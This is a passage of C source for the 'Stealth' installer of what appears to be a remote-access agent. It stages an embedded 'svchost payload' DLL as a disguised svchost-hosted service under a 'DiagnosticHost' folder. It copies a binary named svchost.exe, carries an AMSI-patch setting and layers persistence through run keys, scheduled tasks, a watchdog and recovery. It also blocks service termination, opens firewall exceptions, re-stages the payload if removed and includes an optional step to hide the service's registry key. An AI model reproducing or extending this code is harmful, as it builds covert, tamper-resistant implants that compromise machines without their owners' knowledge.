        Stealth_CreateInstallationDirectory(L"C:\\ProgramData\\DiagnosticHost\\logs");
        g_HaveInstallLogPath = TRUE;
    }
}

static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* context)
{
    if (commandLine == NULL) { return FALSE; }

    BOOL success = FALSE;
    wchar_t* mutableCommand = _wcsdup(commandLine);
    if (mutableCommand == NULL) { return FALSE; }

    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE readPipe = NULL, writePipe = NULL;
    if (!CreatePipe(&readPipe, &writePipe, &sa, 0))
    {
        free(mutableCommand);
        return FALSE;
    }
    SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = writePipe;
    si.hStdError = writePipe;

    Stealth_LogInstallEvent(L"Executing: %ls", commandLine);

    if (CreateProcessW(NULL, mutableCommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(writePipe);
        writePipe = NULL;

        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode = 1;
        GetExitCodeProcess(pi.hProcess, &exitCode);

        CHAR buffer[1024];
        DWORD bytesRead = 0;
        while (ReadFile(readPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
        {
            buffer[bytesRead] = '\0';
            Stealth_DebugPrintfA("%s", buffer);
            Stealth_LogAnsiMessage(buffer);
        }

        Stealth_LogInstallEvent(L"%ls exit code %lu", context ? context : L"Command", exitCode);
        success = (exitCode == 0);

        if (pi.hProcess) { CloseHandle(pi.hProcess); }
        if (pi.hThread) { CloseHandle(pi.hThread); }
    }
    else
    {
        Stealth_DebugLastErrorW(context ? context : L"CreateProcess");
        Stealth_LogInstallEvent(L"%ls failed to launch", context ? context : L"Command");
    }

    if (writePipe) { CloseHandle(writePipe); }
    if (readPipe) { CloseHandle(readPipe); }
    free(mutableCommand);
    return success;
}

static BOOL Stealth_IsAmsiPatchEnabled(void)
{
    const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
    if (stealthProfile == NULL) { return TRUE; }
    return (stealthProfile->amsiPatch != 0);
}

static BOOL Stealth_DoFirewallRulesMatch(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
    if (hostExePath == NULL || hostExePath[0] == L'\0') { return FALSE; }
    if (agentExePath == NULL || agentExePath[0] == L'\0') { return FALSE; }

    return Stealth_CheckFirewallRuleForService(serviceName, hostExePath) &&
           Stealth_CheckWebRtcFirewallRuleForService(serviceName, hostExePath, TRUE) &&
           Stealth_CheckWebRtcFirewallRuleForService(serviceName, agentExePath, FALSE);
}

static BOOL Stealth_WaitForFirewallRuleConvergence(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath, DWORD timeoutMs)
{
    DWORD waited = 0;
    const DWORD pollMs = 500;

    while (TRUE)
    {
        if (Stealth_DoFirewallRulesMatch(serviceName, hostExePath, agentExePath))
        {
            return TRUE;
        }
        if (waited >= timeoutMs)
        {
            break;
        }
        Sleep(pollMs);
        waited += pollMs;
    }
    return FALSE;
}

static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
    if (hostExePath == NULL || hostExePath[0] == L'\0') { return FALSE; }
    if (agentExePath == NULL || agentExePath[0] == L'\0') { return FALSE; }

    for (int attempt = 1; attempt <= STEALTH_FIREWALL_MAX_ATTEMPTS; ++attempt)
    {
        // Best-effort cleanup before (re)adding rules to avoid stale entries.
        (void)Stealth_RemoveFirewallRuleForService(serviceName);
        // Never purge rules by exePath for system32 svchost.exe; that's too broad and can remove OS rules.
        if (_wcsicmp(hostExePath, L"C:\\Windows\\System32\\svchost.exe") != 0)
        {
            (void)Stealth_RemoveFirewallRulesByExePath(hostExePath);
        }
        (void)Stealth_RemoveFirewallRulesByExePath(agentExePath);

        BOOL outboundAdded = Stealth_AddFirewallRuleForService(serviceName, hostExePath);
        BOOL hostWebRtcAdded = Stealth_AddWebRtcFirewallRuleForService(serviceName, hostExePath, TRUE);
        BOOL agentWebRtcAdded = Stealth_AddWebRtcFirewallRuleForService(serviceName, agentExePath, FALSE);

        BOOL converged = Stealth_WaitForFirewallRuleConvergence(
            serviceName,
            hostExePath,
            agentExePath,
            STEALTH_FIREWALL_SETTLE_TIMEOUT_MS);

        if (outboundAdded && hostWebRtcAdded && agentWebRtcAdded && converged)
        {
            if (attempt > 1)
            {
                Stealth_LogInstallEvent(L"Firewall rules converged on retry %d for %ls", attempt, serviceName);
            }
            return TRUE;
        }

        Stealth_LogInstallEvent(
            L"[WARN] Firewall convergence attempt %d/%d failed for %ls (outbound=%u hostWebRtc=%u agentWebRtc=%u converged=%u)",
            attempt,
            STEALTH_FIREWALL_MAX_ATTEMPTS,
            serviceName,
            outboundAdded ? 1 : 0,
            hostWebRtcAdded ? 1 : 0,
            agentWebRtcAdded ? 1 : 0,
            converged ? 1 : 0);

        if (attempt < STEALTH_FIREWALL_MAX_ATTEMPTS)
        {
            Sleep(STEALTH_FIREWALL_RETRY_DELAY_MS);
        }
    }

    return FALSE;
}

static BOOL Stealth_ShouldAttemptSvchostRepairForError(DWORD errorCode)
{
    return (errorCode == ERROR_MOD_NOT_FOUND ||
            errorCode == ERROR_PROC_NOT_FOUND ||
            errorCode == ERROR_FILE_NOT_FOUND ||
            errorCode == ERROR_BAD_EXE_FORMAT);
}

static void Stealth_RecordServiceDllHash(const wchar_t* serviceName, const wchar_t* dllPath)
{
    if (serviceName == NULL || serviceName[0] == L'\0' || dllPath == NULL || dllPath[0] == L'\0') { return; }

    wchar_t dllHashBuffer[STEALTH_SHA256_STRING_LENGTH + 1] = {0};
    if (!Stealth_ComputeFileSha256W(dllPath, dllHashBuffer, _countof(dllHashBuffer)))
    {
        Stealth_LogInstallEvent(L"Failed to compute SHA256 for %ls", dllPath);
        return;
    }

    wchar_t paramsKeyPath[512];
    _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);

    HKEY hParams = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, KEY_WRITE, &hParams) != ERROR_SUCCESS)
    {
        Stealth_LogInstallEvent(L"Failed to open service parameters for hash update (%ls)", serviceName);
        return;
    }

    if (RegSetValueExW(hParams, L"ServiceDllHash", 0, REG_SZ, (const BYTE*)dllHashBuffer,
                       (DWORD)((wcslen(dllHashBuffer) + 1) * sizeof(wchar_t))) == ERROR_SUCCESS)
    {
        Stealth_LogInstallEvent(L"Recorded ServiceDllHash for %ls", serviceName);
    }
    else
    {
        Stealth_LogInstallEvent(L"Failed to record ServiceDllHash for %ls (error=%lu)", serviceName, GetLastError());
    }
    RegCloseKey(hParams);
}

static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath)
{
    if (dllPath == NULL || dllPath[0] == L'\0')
    {
        Stealth_LogInstallEvent(L"Svchost payload validation failed: empty path");
        return FALSE;
    }

    DWORD attrs = GetFileAttributesW(dllPath);
    if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0)
    {
        Stealth_LogInstallEvent(L"Svchost payload validation failed: file missing (%ls)", dllPath);
        return FALSE;
    }

    HMODULE mod = LoadLibraryExW(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mod == NULL)
    {
        DWORD err = GetLastError();
        Stealth_LogInstallEvent(L"Svchost payload load validation failed for %ls (error=%lu)", dllPath, err);
        return FALSE;
    }

    FARPROC serviceMain = GetProcAddress(mod, "Stealth_SvchostServiceMain");
    DWORD procErr = GetLastError();
    FreeLibrary(mod);

    if (serviceMain == NULL)
    {
        Stealth_LogInstallEvent(L"Svchost payload export missing for %ls (expected=Stealth_SvchostServiceMain, error=%lu)", dllPath, procErr);
        return FALSE;
    }

    Stealth_LogInstallEvent(L"Svchost payload validated: %ls (export Stealth_SvchostServiceMain found)", dllPath);
    return TRUE;
}

static BOOL Stealth_VerifySvchostServiceBinding(const wchar_t* serviceName, const wchar_t* dllPath)
{
    if (serviceName == NULL || serviceName[0] == L'\0' || dllPath == NULL || dllPath[0] == L'\0') { return FALSE; }

    wchar_t paramsKeyPath[512];
    _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);

    HKEY hParams = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, KEY_QUERY_VALUE, &hParams) != ERROR_SUCCESS)
    {
        Stealth_LogInstallEvent(L"Svchost binding validation failed: missing Parameters key for %ls", serviceName);
        return FALSE;
    }

    BOOL ok = TRUE;
    wchar_t rawServiceDll[MAX_PATH * 4] = {0};
    DWORD dllType = 0;
    DWORD dllCb = (DWORD)sizeof(rawServiceDll);
    if (RegQueryValueExW(hParams, L"ServiceDll", NULL, &dllType, (LPBYTE)rawServiceDll, &dllCb) != ERROR_SUCCESS ||
        (dllType != REG_SZ && dllType != REG_EXPAND_SZ))
    {
        Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceDll missing for %ls", serviceName);
        ok = FALSE;
    }
    else
    {
        wchar_t resolvedServiceDll[MAX_PATH * 4] = {0};
        if (dllType == REG_EXPAND_SZ)
        {
            DWORD expanded = ExpandEnvironmentStringsW(rawServiceDll, resolvedServiceDll, _countof(resolvedServiceDll));
            if (expanded == 0 || expanded >= _countof(resolvedServiceDll))
            {
                Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceDll expansion failed for %ls", serviceName);
                ok = FALSE;
            }
        }
        else if (FAILED(StringCchCopyW(resolvedServiceDll, _countof(resolvedServiceDll), rawServiceDll)))
        {
            ok = FALSE;
        }

        if (ok)
        {
            wchar_t expectedDll[MAX_PATH * 4] = {0};
            StringCchCopyW(expectedDll, _countof(expectedDll), dllPath);
            MeshInstaller_NormalizePathSeparators(resolvedServiceDll);
            MeshInstaller_NormalizePathSeparators(expectedDll);
            if (_wcsicmp(resolvedServiceDll, expectedDll) != 0)
            {
                Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceDll mismatch (expected=%ls actual=%ls)", expectedDll, resolvedServiceDll);
                ok = FALSE;
            }
        }
    }

    wchar_t serviceMain[128] = {0};
    DWORD serviceMainType = 0;
    DWORD serviceMainCb = (DWORD)sizeof(serviceMain);
    if (RegQueryValueExW(hParams, L"ServiceMain", NULL, &serviceMainType, (LPBYTE)serviceMain, &serviceMainCb) != ERROR_SUCCESS ||
        serviceMainType != REG_SZ ||
        _wcsicmp(serviceMain, L"Stealth_SvchostServiceMain") != 0)
    {
        Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceMain mismatch for %ls", serviceName);
        ok = FALSE;
    }

    DWORD unloadOnStop = 0;
    DWORD unloadType = 0;
    DWORD unloadCb = sizeof(unloadOnStop);
    if (RegQueryValueExW(hParams, L"ServiceDllUnloadOnStop", NULL, &unloadType, (LPBYTE)&unloadOnStop, &unloadCb) != ERROR_SUCCESS ||
        unloadType != REG_DWORD ||
        unloadOnStop != 1)
    {
        Stealth_LogInstallEvent(L"Svchost binding validation failed: ServiceDllUnloadOnStop mismatch for %ls", serviceName);
        ok = FALSE;
    }

    RegCloseKey(hParams);
    if (ok)
    {
        Stealth_LogInstallEvent(L"Svchost binding validated for %ls", serviceName);
    }
    return ok;
}

static BOOL Stealth_AttemptSvchostStartupRepair(const wchar_t* serviceName, const wchar_t* dllPath)
{
    if (serviceName == NULL || serviceName[0] == L'\0' || dllPath == NULL || dllPath[0] == L'\0') { return FALSE; }

    Stealth_LogInstallEvent(L"Attempting svchost self-repair for %ls", serviceName);
    (void)Stealth_StopServiceAndWait(serviceName, 20000, TRUE);

    SetFileAttributesW(dllPath, FILE_ATTRIBUTE_NORMAL);
    (void)DeleteFileW(dllPath);

    if (!MeshSvchostPayload_WriteToPath(dllPath))
    {
        Stealth_LogInstallEvent(L"Svchost self-repair failed: unable to restage embedded payload (%ls, error=%lu)", dllPath, GetLastError());
        return FALSE;
    }

    if (!Stealth_ValidateSvchostPayloadDll(dllPath))
    {
        Stealth_LogInstallEvent(L"Svchost self-repair failed: payload validation failed after restage (%ls)", dllPath);
        return FALSE;
    }

    if (!Stealth_RegisterSvchostService(serviceName, dllPath))
    {
        Stealth_LogInstallEvent(L"Svchost self-repair failed: registration failed for %ls (error=%lu)", serviceName, GetLastError());
        return FALSE;
    }

    if (!Stealth_VerifySvchostServiceBinding(serviceName, dllPath))
    {
        Stealth_LogInstallEvent(L"Svchost self-repair failed: binding verification failed for %ls", serviceName);
        return FALSE;
    }

    Stealth_RecordServiceDllHash(serviceName, dllPath);
    Stealth_LogInstallEvent(L"Svchost self-repair completed for %ls", serviceName);
    return TRUE;
}

static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const wchar_t* dllPath, DWORD timeoutMs, BOOL allowRepair)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }

    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hScm == NULL)
    {
        Stealth_LogInstallEvent(L"Service start failed: OpenSCManager failed (error=%lu)", GetLastError());
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceW(hScm, serviceName, SERVICE_START | SERVICE_QUERY_STATUS);
    if (hService == NULL)
    {
        Stealth_LogInstallEvent(L"Service start failed: OpenService failed for %ls (error=%lu)", serviceName, GetLastError());
        CloseServiceHandle(hScm);
        return FALSE;
    }

    if (!StartServiceW(hService, 0, NULL))
    {
        DWORD startError = GetLastError();
        if (startError != ERROR_SERVICE_ALREADY_RUNNING)
        {
            Stealth_LogInstallEvent(L"StartService failed for %ls (error=%lu)", serviceName, startError);
            CloseServiceHandle(hService);
            CloseServiceHandle(hScm);

            if (allowRepair && Stealth_ShouldAttemptSvchostRepairForError(startError) &&
                Stealth_AttemptSvchostStartupRepair(serviceName, dllPath))
            {
                return Stealth_StartSvchostServiceAndWait(serviceName, dllPath, timeoutMs, FALSE);
            }
            return FALSE;
        }
    }

    DWORD waited = 0;
    BOOL running = FALSE;
    while (waited <= timeoutMs)
    {
        SERVICE_STATUS_PROCESS ssp = {0};
        DWORD bytesNeeded = 0;
        if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded))
        {
            DWORD queryError = GetLastError();
            Stealth_LogInstallEvent(L"QueryServiceStatusEx failed for %ls (error=%lu)", serviceName, queryError);
            break;
        }

        if (ssp.dwCurrentState == SERVICE_RUNNING)
        {
            running = TRUE;
            break;
        }

        if (ssp.dwCurrentState == SERVICE_STOPPED)
        {
            DWORD stopError = ssp.dwWin32ExitCode;
            DWORD stopSpecific = ssp.dwServiceSpecificExitCode;
            Stealth_LogInstallEvent(L"Service %ls stopped during startup (win32=%lu specific=%lu)", serviceName, stopError, stopSpecific);
            break;
        }

        Sleep(500);
        waited += 500;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hScm);

    if (!running && allowRepair && Stealth_AttemptSvchostStartupRepair(serviceName, dllPath))
    {
        return Stealth_StartSvchostServiceAndWait(serviceName, dllPath, timeoutMs, FALSE);
    }

    if (!running)
    {
        Stealth_LogInstallEvent(L"Service %ls failed to reach RUNNING state within %lu ms", serviceName, timeoutMs);
    }

    return running;
}

// ================================================================
// Complete Installation Function
// ================================================================

BOOL Stealth_PerformCompleteInstallation(
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    BOOL useSvchostMode)
{
    UNREFERENCED_PARAMETER(useSvchostMode);
    StealthInstallPaths paths;
    BOOL success = FALSE;
    BOOL dllStaged = FALSE;
    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    wchar_t serviceDescription[512] = {0};
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
    if (persistence)
    {
        Stealth_LogInstallEvent(L"Persistence profile: runKey=%u task=%u restart=%u watchdog=%u",
            persistence->runKey,
            persistence->autorunTask.enabled,
            persistence->restartTask.enabled,
            persistence->watchdog.enabled);
    }
    else
    {
        Stealth_LogInstallEvent(L"Persistence profile missing; RunKey/Task disabled");
    }

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }

    MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, serviceDescription, _countof(serviceDescription));
    if (serviceDescription[0] == L'\0') { StringCchCopyW(serviceDescription, _countof(serviceDescription), STEALTH_FALLBACK_SERVICE_DESCRIPTION); }

    // Get installation paths
    if (!Stealth_GetInstallPaths(&paths))
    {
        Stealth_DebugPrintfW(L"Stealth_GetInstallPaths failed");
        Stealth_LogInstallEvent(L"Install paths unavailable; aborting install");
        return FALSE;
    }
    Stealth_LogInstallEvent(L"Install paths resolved (root=%ls)", paths.installDir);

    // Step 1: Create installation directories
    if (!Stealth_CreateInstallRootDirectory(paths.installDir))
    {
        Stealth_DebugPrintfW(L"Failed to create install directory: %ls", paths.installDir);
        Stealth_LogInstallEvent(L"Failed to create install directory: %ls", paths.installDir);
        return FALSE;
    }

    if (!Stealth_CreateInstallationDirectory(paths.logsDir))
    {
        // Non-fatal, continue
    }

    // Step 2: Copy executable (for CLI usage) if a source path is provided
    if (sourceExePath && sourceExePath[0] != L'\0')
    {
        if (!Stealth_InstallFiles(sourceExePath, paths.exePath))
        {
            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (EXE) %ls -> %ls", sourceExePath, paths.exePath);
            Stealth_LogInstallEvent(L"Failed to copy executable to %ls", paths.exePath);
            return FALSE;
        }
        Stealth_LogInstallEvent(L"Copied executable to %ls", paths.exePath);
    }

    // Host binary must be executable by interactive users so the KVM helper can be launched
    // via CreateProcessAsUser() in the active session.
    if (paths.exePath[0] != L'\0' && GetFileAttributesW(paths.exePath) != INVALID_FILE_ATTRIBUTES)
    {
        if (!Stealth_HardenHostExecutableDacl(paths.exePath))
        {
            Stealth_LogInstallEvent(L"[WARN] Failed to apply host executable DACL to %ls", paths.exePath);
            return FALSE;
        }
    }

    if (sourceExePath && sourceExePath[0] != L'\0')
    {
        if (Stealth_EnsureConfigFile(sourceExePath, paths.confPath))
        {
            Stealth_LogInstallEvent(L"Provisioning config staged to %ls", paths.confPath);
        }
        else
        {
            Stealth_LogInstallEvent(L"[WARN] Unable to stage provisioning config to %ls", paths.confPath);
        }
    }

    if (paths.exePath[0] != L'\0')
    {
        wchar_t mshPath[MAX_PATH] = {0};
        StringCchCopyW(mshPath, _countof(mshPath), paths.exePath);
        wchar_t* dot = wcsrchr(mshPath, L'.');
        if (dot != NULL)
        {
            StringCchCopyW(dot, _countof(mshPath) - (dot - mshPath), L".msh");
        }
        else
        {
            StringCchCatW(mshPath, _countof(mshPath), L".msh");
        }

        if (Stealth_EnsureMshFile(sourceExePath, mshPath, paths.confPath))
        {
            Stealth_LogInstallEvent(L"Provisioning msh staged to %ls", mshPath);
        }
        else
        {
            Stealth_LogInstallEvent(L"[WARN] Unable to stage provisioning msh to %ls", mshPath);
        }

        if (Stealth_ShouldEnableDebugConsole())
        {
            Stealth_AppendConfigOverride(paths.confPath, "debugConsole", "1");
            Stealth_AppendConfigOverride(mshPath, "debugConsole", "1");
        }
    }

    // Always stage the svchost DLL payload
    Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
    if (sourceDllPath && sourceDllPath[0] != L'\0')
    {
        dllStaged = Stealth_InstallFiles(sourceDllPath, paths.dllPath);
        if (!dllStaged)
        {
            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (DLL) %ls -> %ls", sourceDllPath, paths.dllPath);
            Stealth_LogInstallEvent(L"Failed to stage svchost DLL to %ls", paths.dllPath);
        }
    }
    else
    {
        dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
        if (!dllStaged)
        {
            Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
            Stealth_LogInstallEvent(L"Failed to emit embedded svchost DLL to %ls (error=%lu)", paths.dllPath, GetLastError());
            Stealth_LogPathState(paths.dllPath);
            Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
        }
    }

    if (!dllStaged)
    {
        return FALSE;
    }
    Stealth_LogInstallEvent(L"Svchost payload staged to %ls", paths.dllPath);

    if (!Stealth_ValidateSvchostPayloadDll(paths.dllPath))
    {
        if (sourceDllPath && sourceDllPath[0] != L'\0')
        {
            Stealth_LogInstallEvent(L"Provided svchost DLL failed validation; attempting embedded payload fallback");
            Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
            dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
            if (!dllStaged || !Stealth_ValidateSvchostPayloadDll(paths.dllPath))
            {
                Stealth_LogInstallEvent(L"Embedded svchost DLL fallback validation failed for %ls", paths.dllPath);
                return FALSE;
            }
            Stealth_LogInstallEvent(L"Embedded svchost payload fallback staged to %ls", paths.dllPath);
        }
        else
        {
            return FALSE;
        }
    }

    // Register svchost-hosted service only
    if (!Stealth_RegisterSvchostService(serviceKeyName, paths.dllPath))
    {
        Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", serviceKeyName);
        Stealth_LogInstallEvent(L"Svchost registration failed for %ls (error=%lu)", serviceKeyName, GetLastError());
        return FALSE;
    }
    Stealth_LogInstallEvent(L"Svchost registration complete for %ls", serviceKeyName);
    if (!Stealth_VerifySvchostServiceBinding(serviceKeyName, paths.dllPath))
    {
        Stealth_LogInstallEvent(L"Svchost registration binding verification failed for %ls", serviceKeyName);
        return FALSE;
    }
    Stealth_RecordServiceDllHash(serviceKeyName, paths.dllPath);
    Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
    Stealth_ApplyPersistenceProfile();
    success = TRUE;
    Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);

    if (MeshService_HardenServiceDaclByName(serviceKeyName))
    {
        Stealth_LogInstallEvent(L"Hardened service DACL for %ls", serviceKeyName);
    }
    else
    {
        Stealth_LogInstallEvent(L"[WARN] Failed to harden service DACL for %ls (see debug output)", serviceKeyName);
    }

    if (Stealth_ProtectServiceFromTermination(serviceKeyName))
    {
        Stealth_LogInstallEvent(L"Configured service termination protection for %ls", serviceKeyName);
    }
    else
    {
        Stealth_LogInstallEvent(L"[WARN] Service termination protections not applied to %ls", serviceKeyName);
    }

    // Step 4: Add Windows Firewall exceptions
    wchar_t hostExePath[MAX_PATH] = {0};
    const wchar_t* hostToExcept = NULL;
    if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe") &&
        GetFileAttributesW(hostExePath) != INVALID_FILE_ATTRIBUTES)
    {
        hostToExcept = hostExePath;
    }
    else
    {
        hostToExcept = L"C:\\Windows\\System32\\svchost.exe";
    }

    if (!Stealth_RefreshFirewallRulesWithRetry(serviceKeyName, hostToExcept, paths.exePath))
    {
        Stealth_LogInstallEvent(L"[ERROR] Firewall rule provisioning failed for %ls", serviceKeyName);
        return FALSE;
    }

    // Step 5: Apply service resilience (Task Scheduler / WMI restart subscriptions)
    Stealth_LogInstallEvent(L"Applying service resilience configuration");

    // Step 6: Hide service registry key (optional, can make debugging harder)
    // Stealth_HideServiceRegistry(serviceKeyName);

    // Step 7: Start the service and confirm running state
    if (!Stealth_StartSvchostServiceAndWait(serviceKeyName, paths.dllPath, 20000, TRUE))
    {
        Stealth_LogInstallEvent(L"Installation failed: service failed to reach RUNNING state for %ls", serviceKeyName);
        return FALSE;
    }
    Stealth_LogInstallEvent(L"Service reached RUNNING state for %ls", serviceKeyName);

    return success;
}

// ================================================================
// Uninstallation
// ================================================================

BOOL Stealth_PerformCompleteUninstallation(void)
{
    StealthInstallPaths paths;
    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
    BOOL success = TRUE;
    wchar_t svchostPath[MAX_PATH] = {0};
    wchar_t stateDatPath[MAX_PATH] = {0};
    wchar_t stateDirPath[MAX_PATH] = {0};
    wchar_t controlLogPath[MAX_PATH] = {0};
    wchar_t svchostDebugPath[MAX_PATH] = {0};
    wchar_t hostExePath[MAX_PATH] = {0};

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }

    Stealth_SetInstallerLogPathToTemp(L"MeshInstaller-Uninstall.log");
    Stealth_LogInstallEvent(L"Beginning complete uninstallation for %ls", serviceKeyName);

    // Get paths
    Stealth_GetInstallPaths(&paths);
    MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe");

    // Disable recovery and remove restart triggers before stopping
    Stealth_ClearServiceRecovery(serviceKeyName);
    Stealth_RemoveRunKeyEntry(serviceKeyName);
    Stealth_RemoveScheduledTasks(persistence, serviceDisplayName, serviceKeyName);

    // Stop and terminate service/host processes
    Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE);
    Stealth_TerminateProcessesByPath(hostExePath);
    Stealth_TerminateProcessesByPath(paths.exePath);

    // Clean up any persistence artifacts that may have been recreated during shutdown
    Stealth_RemoveScheduledTasks(persistence, serviceDisplayName, serviceKeyName);
    Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE);
    Stealth_TerminateProcessesByPath(hostExePath);
    Stealth_TerminateProcessesByPath(paths.exePath);

    if (!Stealth_UnregisterSvchostService(serviceKeyName))
    {
        Stealth_LogInstallEvent(L"[WARN] Failed to unregister service %ls", serviceKeyName);
        success = FALSE;
    }

    // Remove firewall rules
    if (!Stealth_RemoveFirewallRuleForService(serviceKeyName))
    {
        Stealth_LogInstallEvent(L"[WARN] Failed to remove firewall rules for %ls", serviceKeyName);
        success = FALSE;
    }
    if (!Stealth_RemoveFirewallRulesByExePath(paths.exePath))
    {
        Stealth_LogInstallEvent(L"[WARN] Failed to remove firewall rules for %ls", paths.exePath);
        success = FALSE;
    }

    // Delete files (best-effort)
    if (!Stealth_RemoveFileIfExists(paths.dbPath, TRUE)) { success = FALSE; }
    if (!Stealth_RemoveFileIfExists(paths.logPath, TRUE)) { success = FALSE; }
    if (!Stealth_RemoveFileIfExists(paths.confPath, TRUE)) { success = FALSE; }
    if (!Stealth_RemoveFileIfExists(paths.exePath, TRUE)) { success = FALSE; }
    if (!Stealth_RemoveFileIfExists(paths.dllPath, TRUE)) { success = FALSE; }

    MeshInstaller_CombinePath(svchostPath, _countof(svchostPath), paths.installDir, L"svchost.exe");
    MeshInstaller_CombinePath(stateDatPath, _countof(stateDatPath), paths.installDir, L"state.dat");
    MeshInstaller_CombinePath(stateDirPath, _countof(stateDirPath), paths.installDir, L"state");
    MeshInstaller_CombinePath(controlLogPath, _countof(controlLogPath), paths.installDir, L"controlchannel-debug.log");
    MeshInstaller_CombinePath(svchostDebugPath, _countof(svchostDebugPath), paths.installDir, L"svchost-debug.log");

    if (!Stealth_RemoveFirewallRulesByExePath(svchostPath))
    {
        Stealth_LogInstallEvent(L"[WARN] Failed to remove firewall rules for %ls", svchostPath);
        success = FALSE;
    }

    if (!Stealth_RemoveFileIfExists(controlLogPath, TRUE)) { success = FALSE; }
    if (!Stealth_RemoveFileIfExists(svchostDebugPath, TRUE)) { success = FALSE; }
    if (!Stealth_RemoveFileIfExists(stateDatPath, TRUE)) { success = FALSE; }
    if (!Stealth_RemoveFileIfExists(svchostPath, TRUE)) { success = FALSE; }

    if (!Stealth_RemoveDirectoryTree(stateDirPath, TRUE)) { success = FALSE; }

    Stealth_LogInstallEvent(L"Complete uninstallation finished for %ls", serviceKeyName);

    Stealth_SetInstallerLogPathToTemp(L"MeshInstaller-Uninstall.log");
    if (!Stealth_RemoveDirectoryTree(paths.logsDir, TRUE))
    {
        success = FALSE;
    }
    if (!Stealth_RemoveDirectoryTree(paths.installDir, TRUE))
    {
        Sleep(500);
        if (!Stealth_RemoveDirectoryTree(paths.installDir, TRUE))
        {
            success = FALSE;
        }
    }

    return success;
}

// ================================================================
// Update (in-place repair/update without full uninstall)
// ================================================================

BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode)
{
    if (!useSvchostMode)
    {
        Stealth_LogInstallEvent(L"[UPDATE] Svchost mode required; update aborted");
        return FALSE;
    }

    StealthInstallPaths paths;
    BOOL dllStaged = FALSE;
    BOOL success = TRUE;
    BOOL restartService = FALSE;
    wchar_t serviceKeyName[256] = {0};
